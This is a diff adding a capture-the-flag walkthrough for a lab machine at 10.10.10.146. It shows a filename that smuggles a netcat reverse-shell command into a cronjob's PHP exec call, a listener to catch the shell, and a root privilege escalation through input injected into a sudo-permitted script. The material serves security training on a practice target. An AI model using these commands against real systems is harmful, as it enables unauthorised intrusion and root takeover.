@@ -18,3 +18,36 @@ First, download and study the 10.10.10.146/backup folder, and then you can hop o
 ```
 
 > Turns out we cannot run any of these yet, we need to find another way to get in.
+
+> I will now show you how you get in. First we have to exploit the cronjob running every 3 minutes, it checks for any possible attacks in the uploads folder. And when it deletes those possible malware's from the uploads folder the php script uses a dangerous exec command. We can exploit this by changing the filename to execute us a netcat shell and at the same time look malicious so it gets picked up by the script
+
+```
+cd /var/www/html/uploads
+touch -- ';nc -c bash 10.10.14.29 1234;.php'
+
+---- On your local machine -----
+nc -nvlp 1234
+```
+
+* In a moment you will have yourself a more privileged shell!*
+
+```
+sudo -l
+
+Matching Defaults entries for guly on networked:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+
+
+sh /usr/local/sbin/changename.sh
+```
+
+> Now you will be asked for four values, this script is run as root and in order to escalate your privilege you can do 'INSERTSOMETHING [space] bash' this allows you to exploit a simple linux bug which basicly allows the user to execute anything after the env variable has been set.
